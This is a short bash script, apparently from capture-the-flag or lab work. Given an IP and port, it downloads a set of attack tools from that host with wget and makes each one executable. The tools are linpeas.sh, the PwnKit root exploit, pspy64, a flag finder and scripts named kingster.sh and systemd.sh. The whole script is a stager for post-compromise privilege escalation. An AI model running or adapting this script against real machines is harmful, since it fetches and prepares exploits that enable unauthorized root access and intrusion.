#!/bin/bash

# Check if wget exists on the system
if ! command -v wget &> /dev/null; then
    echo "Error: wget is not installed. Please install wget and try again." >&2
    exit 1
fi

# Check if the script is called with at least one argument (IP)
if [ $# -lt 1 ]; then
    echo "Usage: $0 <IP> [PORT]"
    exit 255
elif [ $# -lt 2 ]; then
    PORT=80  # Default HTTP port
else
    PORT="$2"
fi

# Array with files to download
files=(
    "kingster.sh"
    "systemd.sh"
    "flag-finder.sh"
    "linpeas.sh"
    "PwnKit"
    "static/pspy64"
    "animations/nyan"
    "animations/hello.sh"
)

# Define ANSI color codes
G='\033[0;32m'  # Green color
R='\033[0;31m'  # Red color
N='\033[0m'     # No color

# Start message
echo "Output directory: $(pwd)"

# Loop through the file names and use wget to download each file to the current directory
for file in "${files[@]}"; do
    url="http://$1:${PORT}/${file}"

    # Use wget to download the file silently (redirecting output to /dev/null)
    wget -q "$url"

    # Check if the download was successful
    if [ $? -eq 0 ]; then
        file=$(echo ${file} | rev | cut -d '/' -f 1 | rev)
        chmod +x ${file}  # Set executable permissions on downloaded file
	echo -e "Downloaded $G$file$N"
    else
        echo -e "Failed to download $R$file$N"
    fi
done
